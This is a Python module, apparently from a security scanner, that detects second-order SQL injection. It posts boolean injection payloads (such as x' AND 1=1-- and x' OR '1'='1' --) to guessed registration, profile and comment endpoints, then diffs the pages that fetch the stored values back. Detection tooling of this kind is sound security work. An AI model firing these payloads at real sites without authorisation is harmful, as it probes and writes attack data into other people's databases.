"""Second-order SQLi detection.

A payload is stored (register / profile update / review) and later fetched in
a context where it is concatenated into another SQL statement. Detection:
store a marker + boolean pair, fetch, and diff the fetched responses.

Store/fetch endpoints are inferred from common paths; callers can override.
"""
from typing import Dict, List, Optional

import requests

from tools._session import make_session
from tools.log_utils import get_logger

logger = get_logger("second_order_sqli")

STORE_PATHS = [
    "/register", "/signup", "/profile/update", "/profile", "/settings",
    "/api/user/update", "/api/user", "/comment", "/post", "/review", "/feedback",
]
FETCH_PATHS = [
    "/profile", "/me", "/dashboard", "/account", "/api/user",
    "/api/profile", "/post", "/view", "/admin/users",
]

MARKER = "SOSQLI_%d" % 12345

_BOOL_PAIRS = [
    ("x' AND 1=1-- ", "x' AND 1=2-- "),
    ("x' OR '1'='1' -- ", "x' OR '1'='2' -- "),
    ("x\" AND 1=1-- ", "x\" AND 1=2-- "),
    ("x AND 1=1-- ", "x AND 1=2-- "),
]


def _guess_paths(url: str) -> tuple:
    from urllib.parse import urlparse
    parsed = urlparse(url)
    base = "%s://%s" % (parsed.scheme, parsed.netloc)
    path = parsed.path.rstrip("/")
    store = [base + p for p in STORE_PATHS]
    fetch = [base + p for p in FETCH_PATHS]
    if path:
        store.insert(0, base + path + "/update")
        store.insert(0, base + path)
        fetch.insert(0, base + path)
        fetch.insert(0, base + path + "/view")
    return store, fetch


def _diff_significant(r1, r2) -> bool:
    if r1 is None or r2 is None:
        return False
    if r1.status_code != r2.status_code:
        return abs(r1.status_code - r2.status_code) >= 100
    return abs(len(r1.text) - len(r2.text)) > 40


def check(url: str, param: str = "username", sess: Optional[requests.Session] = None,
          timeout: float = 10.0, store_paths: Optional[List[str]] = None,
          fetch_paths: Optional[List[str]] = None) -> Dict:
    sess = sess or make_session()
    result = {"vulnerable": False, "type": "second_order_sqli",
              "evidence": [], "store_path": None, "fetch_path": None,
              "pair": None}
    stores, fetches = _guess_paths(url)
    if store_paths:
        stores = store_paths + stores
    if fetch_paths:
        fetches = fetch_paths + fetches

    for store_url in stores[:4]:
        for true_p, false_p in _BOOL_PAIRS:
            marker = "%s_%d" % (MARKER, hash(true_p) % 10000)
            try:
                # store false -> fetch; store true -> fetch; diff the two.
                sess.post(store_url, data={param: marker + false_p}, timeout=timeout)
                r_false = sess.get(fetches[0], timeout=timeout)
                sess.post(store_url, data={param: marker + true_p}, timeout=timeout)
                r_true = sess.get(fetches[0], timeout=timeout)
            except Exception as e:
                logger.debug("so-sqli store/fetch: %s", e)
                continue
            if _diff_significant(r_true, r_false):
                reflected = marker in (r_true.text or "") or marker in (r_false.text or "")
                result["vulnerable"] = True
                result["store_path"] = store_url
                result["fetch_path"] = fetches[0]
                result["pair"] = (true_p[:20], false_p[:20])
                result["evidence"].append(
                    "second-order: stored %s at %s, fetched diff at %s (reflected=%s)" % (
                        true_p[:20], store_url, fetches[0], reflected))
                return result

    return result
